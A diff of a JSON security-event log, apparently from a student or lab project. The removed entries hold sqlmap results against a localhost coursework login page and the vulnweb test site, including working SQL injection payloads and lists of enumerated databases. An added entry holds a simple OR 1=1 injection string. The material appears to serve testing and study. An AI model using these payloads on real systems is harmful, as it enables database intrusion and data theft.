@@ -1,66 +1,24 @@
 [
     {
-        "timestamp": "2025-03-20 01:37:13",
-        "event_type": "SQL Injection",
-        "details": {
-            "target": "http://localhost/cw1-Sam-E04/LogIn.php",
-            "result": "[*] starting @ 01:36:51 /2025-03-20/\n[01:36:55] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'\n[01:36:57] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'\n[01:36:59] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'\nType: boolean-based blind\nTitle: AND boolean-based blind - WHERE or HAVING clause\nPayload: hidden_id=2 AND 4778=4778&details=Details\nType: error-based\nTitle: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)\nPayload: hidden_id=2 AND (SELECT 1505 FROM(SELECT COUNT(*),CONCAT(0x71627a6271,(SELECT (ELT(1505=1505,1))),0x7171707071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)&details=Details\nType: time-based blind\nTitle: MySQL >= 5.0.12 AND time-based blind (query SLEEP)\nPayload: hidden_id=2 AND (SELECT 3826 FROM (SELECT(SLEEP(5)))SrIZ)&details=Details\nType: UNION query\nTitle: Generic UNION query (NULL) - 8 columns\nPayload: hidden_id=-1415 UNION ALL SELECT NULL,CONCAT(0x71627a6271,0x56666550656d66596961784c6a7045535a655247636d54747441796e5457657558715272587a676c,0x7171707071),NULL,NULL,NULL,NULL,NULL,NULL-- -&details=Details\navailable databases [6]:\n[*] information_schema\n[*] ltc_db\n[*] mysql\n[*] performance_schema\n[*] phpmyadmin\n[*] test\n[*] ending @ 01:37:13 /2025-03-20/"
-        }
-    },
-    {
-        "timestamp": "2025-03-22 01:37:10",
-        "event_type": "SQL Injection",
-        "details": {
-            "target": "http://localhost/cw1-Sam-E04/LogIn.php",
-            "result": "[*] starting @ 01:37:04 /2025-03-22/\n[01:37:06] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'\n[01:37:07] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'\n[01:37:09] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'\n[*] ending @ 01:37:10 /2025-03-22/"
-        }
-    },
-    {
-        "timestamp": "2025-03-23 13:07:40",
-        "event_type": "SQL Injection",
-        "details": {
-            "target": "http://testphp.vulnweb.com",
-            "result": "[*] starting @ 13:07:38 /2025-03-23/\nType: boolean-based blind\nTitle: MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)\nPayload: searchFor=cJus' AND EXTRACTVALUE(1943,CASE WHEN (1943=1943) THEN 1943 ELSE 0x3A END) AND 'zwHs'='zwHs&goButton=go\nType: error-based\nTitle: MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)\nPayload: searchFor=cJus' OR GTID_SUBSET(CONCAT(0x717a626b71,(SELECT (ELT(3602=3602,1))),0x7176707171),3602) AND 'YFzn'='YFzn&goButton=go\nType: time-based blind\nTitle: MySQL >= 5.0.12 AND time-based blind (query SLEEP)\nPayload: searchFor=cJus' AND (SELECT 8575 FROM (SELECT(SLEEP(5)))Orer) AND 'YcTp'='YcTp&goButton=go\navailable databases [2]:\n[*] acuart\n[*] information_schema\n[*] ending @ 13:07:40 /2025-03-23/"
-        }
-    },
-    {
-        "timestamp": "2025-03-23 13:32:19",
-        "event_type": "SQL Injection",
-        "details": {
-            "target": "http://testphp.vulnweb.com",
-            "result": "[*] starting @ 13:32:18 /2025-03-23/\nType: boolean-based blind\nTitle: MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)\nPayload: searchFor=cJus' AND EXTRACTVALUE(1943,CASE WHEN (1943=1943) THEN 1943 ELSE 0x3A END) AND 'zwHs'='zwHs&goButton=go\nType: error-based\nTitle: MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)\nPayload: searchFor=cJus' OR GTID_SUBSET(CONCAT(0x717a626b71,(SELECT (ELT(3602=3602,1))),0x7176707171),3602) AND 'YFzn'='YFzn&goButton=go\nType: time-based blind\nTitle: MySQL >= 5.0.12 AND time-based blind (query SLEEP)\nPayload: searchFor=cJus' AND (SELECT 8575 FROM (SELECT(SLEEP(5)))Orer) AND 'YcTp'='YcTp&goButton=go\navailable databases [2]:\n[*] acuart\n[*] information_schema\n[*] ending @ 13:32:19 /2025-03-23/"
-        }
-    },
-    {
-        "timestamp": "2025-03-24 18:00:49",
+        "timestamp": "2025-04-13 12:21:52",
         "event_type": "XSS",
+        "target": "172.168.1.32",
+        "attacker_ip": "ManualInput",
+        "source_ip": null,
         "details": {
-            "target": "http://testphp.vulnweb.com",
-            "result": ""
+            "payload": "filler info",
+            "result": "filler info"
         }
     },
     {
-        "timestamp": "2025-03-24 19:15:47",
-        "event_type": "SQL Injection",
+        "timestamp": "2025-04-14 06:47:42",
+        "event_type": "SQLi",
+        "target": "172.168.1.32",
+        "attacker_ip": "192.168.1.55",
+        "source_ip": null,
         "details": {
-            "target": "http://testphp.vulnweb.com/login.php",
-            "result": "[*] starting @ 19:15:45 /2025-03-24/\nType: boolean-based blind\nTitle: MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)\nPayload: searchFor=cJus' AND EXTRACTVALUE(1943,CASE WHEN (1943=1943) THEN 1943 ELSE 0x3A END) AND 'zwHs'='zwHs&goButton=go\nType: error-based\nTitle: MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)\nPayload: searchFor=cJus' OR GTID_SUBSET(CONCAT(0x717a626b71,(SELECT (ELT(3602=3602,1))),0x7176707171),3602) AND 'YFzn'='YFzn&goButton=go\nType: time-based blind\nTitle: MySQL >= 5.0.12 AND time-based blind (query SLEEP)\nPayload: searchFor=cJus' AND (SELECT 8575 FROM (SELECT(SLEEP(5)))Orer) AND 'YcTp'='YcTp&goButton=go\navailable databases [2]:\n[*] acuart\n[*] information_schema\n[*] ending @ 19:15:47 /2025-03-24/"
-        }
-    },
-    {
-        "timestamp": "2025-03-28 22:49:10",
-        "event_type": "XSS",
-        "details": {
-            "target": "http://testphp.vulnweb.com/login.php",
-            "result": ""
-        }
-    },
-    {
-        "timestamp": "2025-03-28 22:50:11",
-        "event_type": "XSS",
-        "details": {
-            "target": "http://testphp.vulnweb.com/login.php",
-            "result": ""
+            "payload": "\" OR 1 = 1 -- -",
+            "result": "\" OR 1 = 1 -- -"
         }
     }
 ]
